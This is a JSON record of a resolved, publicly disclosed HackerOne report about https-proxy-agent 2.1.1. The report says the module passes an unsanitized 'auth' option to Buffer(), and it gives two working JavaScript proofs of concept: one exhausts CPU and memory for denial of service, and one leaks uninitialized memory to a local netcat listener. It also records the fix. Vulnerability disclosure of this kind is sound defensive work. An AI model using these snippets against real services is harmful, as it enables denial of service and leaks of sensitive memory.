@@ -1,0 +1,156 @@
+{
+  "id": 319532,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTk1MzI=",
+  "url": "https://hackerone.com/reports/319532",
+  "title": "`https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-25T12:56:44.574Z",
+  "submitted_at": "2018-02-25T12:56:44.574Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "chalker",
+    "url": "/chalker",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-02T20:49:07.192Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-03T20:48:53.761Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a Buffer allocation vulnerability in `https-proxy-agent`.\n\nIn setups where `auth` argument is user-controlled, it allows to:\n1. cause Denial of Service by trivially consuming all the available CPU resources\n2. extract uninitialized memory chunks from the server on Node.js <8.x.\n\n# Module\n\n**module name:** https-proxy-agent\n**version:** 2.1.1 \n**npm page:** `https://www.npmjs.com/package/https-proxy-agent`\n\n## Module Description\n\n> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in https module.\n\n## Module Stats\n\n114 304 downloads in the last day\n1 668 955 downloads in the last week\n6 758 891 downloads in the last month\n\n~81 106 692 estimated downloads per year\n\n# Vulnerability\n\n## Vulnerability Description\n\n`https-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).\n\nThe exact line: https://github.com/TooTallNate/node-https-proxy-agent/blob/2.1.1/index.js#L207\n\n## Steps To Reproduce:\n\n### DoS\n```js\nvar url = require('url');\nvar https = require('https');\nvar HttpsProxyAgent = require('https-proxy-agent');\n\nvar proxy = {\n  protocol: 'http:',\n  host: \"127.0.0.1\",\n  port: 8080\n};\n\nsetInterval(() => {\n  proxy.auth = 1e9; // a number as 'auth'\n  var opts = url.parse('https://example.com/');\n  var agent = new HttpsProxyAgent(proxy);\n  opts.agent = agent;\n  console.time('tick');\n  https.get(opts);\n  console.timeEnd('tick');\n}, 200);\n```\n\nObserve how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.\n\n### Uninitialized memory leak\n\n```js\n// listen with: nc -l -p 8080\n\nvar url = require('url');\nvar https = require('https');\nvar HttpsProxyAgent = require('https-proxy-agent');\n\nvar proxy = {\n  protocol: 'http:',\n  host: \"127.0.0.1\",\n  port: 8080\n};\n\nproxy.auth = 500; // a number as 'auth'\nvar opts = url.parse('https://example.com/');\nvar agent = new HttpsProxyAgent(proxy);\nopts.agent = agent;\nhttps.get(opts);\n```\n\nListen with `nl -l -p 8080` to see requests.\n\nExecute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.\n\nThis leaks uninitialized Buffer memory on Node.js <8.x.\nOn ≥8.x those Buffers (that are using the deprecated API) are zero-filled.\n\n## Supporting Material/References:\n\n- OS: Arch Linux current\n- Node.js 9.5.0\n- npm 5.6.0\n- gnu-netcat 0.7.1\n\n# Wrap up\n\n- I contacted the maintainer to let him know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nDenial of service\nSensitive data leak (on Node.js <8.0)",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-04-02T20:48:53.836Z",
+  "allow_singular_disclosure_after": -255638141.69777286,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "bagipro",
+    "bl4de",
+    "trainzment",
+    "apapedulimu",
+    "eveeez",
+    "japz",
+    "4amhunter"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6412,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https-proxy-agent",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 6756,
+      "category": "researcher",
+      "content": "Unguarded `Buffer(arg)` in `auth` option, which can leak data or cause DoS if typed user input (e.g. from JSON) ends up there.\nResolved in `https-proxy-agent@2.2.0` by switching to `Buffer.from(arg)` (new Buffer API). ",
+      "updated_at": "2018-03-03T21:05:58.555Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 68907,
+        "username": "chalker",
+        "name": "Nikita Skovoroda",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://github.com/ChALkeR",
+        "location": "",
+        "created_at": "2016-04-12T21:43:38.517Z",
+        "url": "https://hackerone.com/chalker",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    }
+  ]
+}
